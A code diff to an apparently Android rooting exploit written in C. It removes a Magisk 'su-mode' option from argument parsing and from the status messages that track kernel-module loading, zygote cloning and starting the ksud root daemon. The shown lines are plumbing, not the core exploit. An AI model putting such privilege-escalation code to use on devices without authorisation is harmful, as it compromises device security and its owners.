@@ -24,7 +24,6 @@
 
 static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
 static char    *libcxx_ko_target;
-static int g_su_mode_magisk = 0;  /* --su-mode magisk: 4.19 uses Magisk instead of ksud */
 
 static int      g_encap_port;
 static int      g_sender_port;
@@ -1202,7 +1201,7 @@ static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
 
 static void usage(const char *argv0) {
     fprintf(stderr,
-            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX [--su-mode ksu|magisk]\n", argv0);
+            "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX\n", argv0);
 }
 
 static int setup(int argc, char **argv) {
@@ -1221,8 +1220,6 @@ static int setup(int argc, char **argv) {
             spi = (uint32_t)strtoul(argv[++i], NULL, 0);
         else if (!strcmp(a, "--aes-key") && i + 1 < argc)
             have_aes = hex_to_bytes(argv[++i], aes_key, sizeof(aes_key)) == 0;
-        else if (!strcmp(a, "--su-mode") && i + 1 < argc)
-            g_su_mode_magisk = !strcmp(argv[++i], "magisk");
         else { usage(argv[0]); return 2; }
     }
     if (!encap_port || !sender_port || !spi || !have_aes) {
@@ -1267,22 +1264,21 @@ static int exploit(void) {
     static const struct {
         const char *path;
         const char *msg;
-        const char *msg_magisk;   /* NULL = same as msg */
         int         rc;
     } markers[] = {
-        { "/dev/df",    "libc++: loading custom module",                    NULL, -1 },
-        { "/dev/dfm0",  "kernel module: launching bootstrap", "kernel module: launching magisk", -1 },
-        { "/dev/dfm1",  "bootstrap: loading app preferences file",          NULL, -1 },
-        { "/dev/dfme0", "bootstrap: ERROR - reading prefs failed",          NULL,  1 },
-        { "/dev/dfm2",  "bootstrap: cloning zygote env",                    NULL, -1 },
-        { "/dev/dfmw0", "bootstrap: WARNING - clone zygote env failed",     NULL, -1 },
-        { "/dev/dfm3",  "bootstrap: setting partitions ro",                 NULL, -1 },
-        { "/dev/dfmw1", "bootstrap: WARNING - set partitions ro failed",    NULL, -1 },
-        { "/dev/dfm4",  "bootstrap: disabling ksu modules",                 NULL, -1 },
-        { "/dev/dfme1", "bootstrap: ERROR - disable modules failed",        NULL,  1 },
-        { "/dev/dfm5",  "bootstrap: starting SU daemon",      "magisk: starting magiskd", -1 },
-        { "/dev/dfm6",  "ksud start: SUCCESS",                "magiskd start: SUCCESS",     0 },
-        { "/dev/dfme2", "ksud start: ERROR - ksud nonzero exit", "magiskd start: ERROR",     1 },
+        { "/dev/df",    "libc++: loading custom module",                    -1 },
+        { "/dev/dfm0",  "kernel module: launching bootstrap",               -1 },
+        { "/dev/dfm1",  "bootstrap: loading app preferences file",          -1 },
+        { "/dev/dfme0", "bootstrap: ERROR - reading prefs failed",           1 },
+        { "/dev/dfm2",  "bootstrap: cloning zygote env",                    -1 },
+        { "/dev/dfmw0", "bootstrap: WARNING - clone zygote env failed",     -1 },
+        { "/dev/dfm3",  "bootstrap: setting partitions ro",                 -1 },
+        { "/dev/dfmw1", "bootstrap: WARNING - set partitions ro failed",    -1 },
+        { "/dev/dfm4",  "bootstrap: disabling ksu modules",                 -1 },
+        { "/dev/dfme1", "bootstrap: ERROR - disable modules failed",         1 },
+        { "/dev/dfm5",  "bootstrap: starting SU daemon",                    -1 },
+        { "/dev/dfm6",  "ksud start: SUCCESS",                               0 },
+        { "/dev/dfme2", "ksud start: ERROR - ksud nonzero exit",             1 },
     };
     int seen[sizeof(markers)/sizeof(markers[0])] = {0};
 
@@ -1291,8 +1287,7 @@ static int exploit(void) {
         for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
             if (!seen[j] && access(markers[j].path, F_OK) == 0) {
                 seen[j] = 1;
-                printf("%s\n", (g_su_mode_magisk && markers[j].msg_magisk)
-                               ? markers[j].msg_magisk : markers[j].msg);
+                printf("%s\n", markers[j].msg);
                 if (markers[j].rc >= 0) {
                     rc = markers[j].rc;
                     /* Let the deploy worker move past the freshly loaded LKM
